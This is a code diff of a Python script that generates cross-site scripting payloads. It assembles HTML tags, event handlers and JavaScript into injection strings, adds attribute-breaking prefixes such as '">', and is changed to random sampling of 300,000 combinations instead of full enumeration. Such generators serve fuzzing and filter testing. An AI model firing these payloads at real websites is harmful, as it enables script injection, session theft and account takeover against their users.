@@ -42,7 +42,9 @@ extra3s = get_options('extra3')
 
 payload_format = '{extra1}<{tag}{s1}{extra2}{s2}{handler}{s3}={s4}{js}{s5}>{extra3}'
 
-for extra1, tag, s1, extra2, s2, handler, s3, s4, js, s5, extra3 in itertools.product(extra1s, tags, s1s, extra2s, s2s, handlers, s3s, s4s, jss, s5s, extra3s):
+lists = (extra1s, tags, s1s, extra2s, s2s, handlers, s3s, s4s, jss, s5s, extra3s)
+for i in range(300000):
+    extra1, tag, s1, extra2, s2, handler, s3, s4, js, s5, extra3 = list(map(random.choice, lists))
     if (not s1):
         s1 = ' '
     if extra2 and (not s2):
@@ -52,3 +54,15 @@ for extra1, tag, s1, extra2, s2, handler, s3, s4, js, s5, extra3 in itertools.pr
     for prefix in ['', '">', "'>", '>']:
         prefix_payload = prefix+payload
         print(prefix_payload)
+
+#generate all payloads, but this take too much time and disk space
+#for extra1, tag, s1, extra2, s2, handler, s3, s4, js, s5, extra3 in itertools.product(extra1s, tags, s1s, extra2s, s2s, handlers, s3s, s4s, jss, s5s, extra3s):
+#    if (not s1):
+#        s1 = ' '
+#    if extra2 and (not s2):
+#        s2 = ' '
+#    s = f'payload=f\'{payload_format}\''
+#    exec(s, globals(), locals())
+#    for prefix in ['', '">', "'>", '>']:
+#        prefix_payload = prefix+payload
+#        print(prefix_payload)
